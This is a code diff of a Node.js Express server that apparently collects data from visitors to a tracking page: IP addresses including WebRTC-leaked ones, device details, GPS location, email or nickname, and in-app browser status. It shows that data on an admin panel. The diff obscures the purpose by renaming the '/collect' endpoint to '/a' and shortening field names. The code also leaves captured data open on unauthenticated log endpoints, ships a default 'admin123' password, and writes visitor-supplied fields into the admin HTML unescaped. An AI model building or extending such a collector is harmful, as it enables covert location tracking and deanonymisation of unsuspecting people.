@@ -7,8 +7,7 @@ const cookieParser = require('cookie-parser');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+const ADMIN_PASS = process.env.ADMIN_PASSWORD || 'admin123';
 
 const sessions = {};
 let logHistory = [];
@@ -20,39 +19,40 @@ app.use(express.urlencoded({ extended: true }));
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname)));
 
-function generateToken() {
+function genToken() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-function isAuthenticated(req) {
+function isAuth(req) {
     const token = req.cookies?.admin_session;
     if (!token) return false;
-    if (sessions[token] && sessions[token].expires > Date.now()) {
-        return true;
-    }
+    if (sessions[token] && sessions[token].expires > Date.now()) return true;
     return false;
 }
 
-app.post('/collect', (req, res) => {
+app.post('/a', (req, res) => {
     const data = req.body;
-    if (!data) {
-        return res.status(400).json({ status: 'error', message: 'No data' });
-    }
+    if (!data) return res.status(400).json({ s: 'e', m: 'No data' });
+    
     const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    data.server_side_ip = clientIP;
+    data.sip = clientIP;
+    
     const entry = {
-        received_at: new Date().toISOString(),
-        payload: data
+        ra: new Date().toISOString(),
+        pl: data
     };
+    
     logHistory.push(entry);
     lastData = data;
+    
     try {
-        fs.appendFileSync('data.log', `[${entry.received_at}] ${JSON.stringify(data)}\n`, 'utf8');
+        fs.appendFileSync('data.log', `[${entry.ra}] ${JSON.stringify(data)}\n`, 'utf8');
     } catch (err) {
         console.error('File write error:', err.message);
     }
-    console.log('Received data:', JSON.stringify(data, null, 2));
-    res.json({ status: 'success', message: 'Data logged' });
+    
+    console.log('Received:', JSON.stringify(data, null, 2));
+    res.json({ s: 'ok', m: 'Logged' });
 });
 
 app.get('/login', (req, res) => {
@@ -84,51 +84,47 @@ app.get('/login', (req, res) => {
 
 app.post('/login', (req, res) => {
     const { password } = req.body;
-    if (password === ADMIN_PASSWORD) {
-        const token = generateToken();
+    if (password === ADMIN_PASS) {
+        const token = genToken();
         sessions[token] = { expires: Date.now() + 3600000 };
         res.cookie('admin_session', token, { httpOnly: true, maxAge: 3600000 });
         return res.redirect('/admin');
-    } else {
-        return res.redirect('/login?error=1');
     }
+    return res.redirect('/login?error=1');
 });
 
-// Endpoint to get a single record's full payload as JSON
 app.get('/record/:id', (req, res) => {
-    if (!isAuthenticated(req)) {
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
+    if (!isAuth(req)) return res.status(401).json({ e: 'Unauthorized' });
     const id = parseInt(req.params.id);
     if (isNaN(id) || id < 0 || id >= logHistory.length) {
-        return res.status(404).json({ error: 'Record not found' });
+        return res.status(404).json({ e: 'Not found' });
     }
     res.json(logHistory[id]);
 });
 
 app.get('/admin', (req, res) => {
-    if (!isAuthenticated(req)) {
-        return res.redirect('/login');
-    }
-
+    if (!isAuth(req)) return res.redirect('/login');
+    
     let rows = '';
     if (logHistory.length === 0) {
         rows = '<tr><td colspan="7" style="text-align:center;">No records yet.</td></tr>';
     } else {
         logHistory.forEach((entry, index) => {
-            const p = entry.payload;
-            const ip = p.webrtc?.public || p.server_side_ip || 'N/A';
-            const device = (p.basic?.userAgent || 'Unknown').substring(0, 60) + (p.basic?.userAgent?.length > 60 ? '…' : '');
-            const location = p.location ? `${p.location.latitude}, ${p.location.longitude} (acc: ${p.location.accuracy}m)` : 'Not shared';
+            const p = entry.pl;
+            const ip = p.w?.public || p.sip || 'N/A';
+            const device = (p.b?.ua || 'Unknown').substring(0, 60) + (p.b?.ua?.length > 60 ? '...' : '');
+            const loc = p.loc ? `${p.loc.lat}, ${p.loc.lon} (acc: ${p.loc.acc || 'N/A'}m) [${p.loc.src}]` : 'Not shared';
             const email = p.email || p.nick || '—';
-            const time = new Date(entry.received_at).toLocaleString();
-            rows += `<tr onclick="viewRecord(${index})" style="cursor:pointer;">
+            const time = new Date(entry.ra).toLocaleString();
+            const inApp = p.i?.any ? '⚠️ In-App' : '✅ Browser';
+            rows += `<tr onclick="viewRec(${index})" style="cursor:pointer;">
                 <td>${index + 1}</td>
                 <td>${time}</td>
                 <td>${ip}</td>
                 <td style="font-size:12px; word-break:break-word;">${device}</td>
-                <td>${location}</td>
+                <td>${loc}</td>
                 <td>${email}</td>
+                <td>${inApp}</td>
             </tr>`;
         });
     }
@@ -140,7 +136,7 @@ app.get('/admin', (req, res) => {
     <title>Admin - Visitor Records</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f7fa; margin: 20px; }
-        .container { max-width: 1200px; margin: auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
         h1 { font-size: 24px; margin-bottom: 10px; color: #1a1a2e; }
         .meta { color: #666; font-size: 14px; margin-bottom: 20px; }
         table { width: 100%; border-collapse: collapse; font-size: 14px; }
@@ -149,48 +145,20 @@ app.get('/admin', (req, res) => {
         tr:hover { background: #f0f4ff; }
         .logout { margin-top: 20px; }
         .logout a { color: #1a73e8; text-decoration: none; }
-
-        /* Modal styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0; top: 0;
-            width: 100%; height: 100%;
-            overflow: auto;
-            background-color: rgba(0,0,0,0.5);
-        }
-        .modal-content {
-            background-color: white;
-            margin: 5% auto;
-            padding: 20px;
-            border-radius: 12px;
-            width: 80%;
-            max-width: 800px;
-            max-height: 80%;
-            overflow-y: auto;
-            box-shadow: 0 4px 30px rgba(0,0,0,0.3);
-        }
-        .close {
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
+        .modal-content { background-color: white; margin: 5% auto; padding: 20px; border-radius: 12px; width: 80%; max-width: 900px; max-height: 80%; overflow-y: auto; box-shadow: 0 4px 30px rgba(0,0,0,0.3); }
+        .close { float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
         .close:hover { color: #999; }
-        .modal pre {
-            background: #f5f7fa;
-            padding: 15px;
-            border-radius: 8px;
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-size: 13px;
-        }
+        .modal pre { background: #f5f7fa; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-word; font-size: 13px; max-height: 500px; overflow-y: auto; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
+        .badge-gps { background: #e8f5e9; color: #2e7d32; }
+        .badge-ip { background: #fff8e1; color: #f57f17; }
+        .badge-none { background: #fff0f0; color: #c62828; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📋 Visitor Records</h1>
+    <h1>📊 Visitor Records</h1>
     <div class="meta">Total entries: <strong>${logHistory.length}</strong> &nbsp;|&nbsp; <a href="/logout">Logout</a></div>
     <table>
         <thead>
@@ -199,19 +167,17 @@ app.get('/admin', (req, res) => {
                 <th>Time</th>
                 <th>IP Address</th>
                 <th>Device / Browser</th>
-                <th>Location (GPS)</th>
+                <th>Location</th>
                 <th>Email / Nick</th>
+                <th>Browser Type</th>
             </tr>
         </thead>
-        <tbody>
-            ${rows}
-        </tbody>
+        <tbody>${rows}</tbody>
     </table>
     <div class="footer" style="margin-top:20px; font-size:13px; color:#999;">Click on a row to view full data.</div>
 </div>
 
-<!-- Modal -->
-<div id="recordModal" class="modal">
+<div id="recModal" class="modal">
     <div class="modal-content">
         <span class="close" onclick="closeModal()">&times;</span>
         <h3>Full Record Details</h3>
@@ -220,26 +186,21 @@ app.get('/admin', (req, res) => {
 </div>
 
 <script>
-    function viewRecord(id) {
+    function viewRec(id) {
         fetch('/record/' + id)
-            .then(res => res.json())
+            .then(r => r.json())
             .then(data => {
                 document.getElementById('modalPayload').textContent = JSON.stringify(data, null, 2);
-                document.getElementById('recordModal').style.display = 'block';
+                document.getElementById('recModal').style.display = 'block';
             })
-            .catch(err => {
-                alert('Error loading record: ' + err);
-            });
+            .catch(err => alert('Error: ' + err));
     }
     function closeModal() {
-        document.getElementById('recordModal').style.display = 'none';
+        document.getElementById('recModal').style.display = 'none';
     }
-    // Close modal when clicking outside the content
-    window.onclick = function(event) {
-        const modal = document.getElementById('recordModal');
-        if (event.target == modal) {
-            modal.style.display = 'none';
-        }
+    window.onclick = function(e) {
+        const modal = document.getElementById('recModal');
+        if (e.target == modal) modal.style.display = 'none';
     }
 </script>
 </body>
@@ -257,33 +218,23 @@ app.get('/logout', (req, res) => {
 });
 
 app.get('/records', (req, res) => {
-    if (isAuthenticated(req)) {
-        return res.redirect('/admin');
-    }
+    if (isAuth(req)) return res.redirect('/admin');
     res.redirect('/login');
 });
 
 app.get('/logs', (req, res) => {
-    if (logHistory.length === 0) {
-        return res.status(404).json({ status: 'error', message: 'No logs yet' });
-    }
+    if (logHistory.length === 0) return res.status(404).json({ s: 'e', m: 'No logs' });
     res.json(logHistory);
 });
 
 app.get('/rawlog', (req, res) => {
-    if (lastData) {
-        res.json(lastData);
-    } else {
-        res.status(404).json({ status: 'error', message: 'No data captured yet' });
-    }
+    if (lastData) res.json(lastData);
+    else res.status(404).json({ s: 'e', m: 'No data' });
 });
 
 app.get('/log', (req, res) => {
-    if (fs.existsSync('data.log')) {
-        res.sendFile(path.join(__dirname, 'data.log'));
-    } else {
-        res.status(404).send('No log file yet');
-    }
+    if (fs.existsSync('data.log')) res.sendFile(path.join(__dirname, 'data.log'));
+    else res.status(404).send('No log file');
 });
 
 app.get('/ip', (req, res) => {
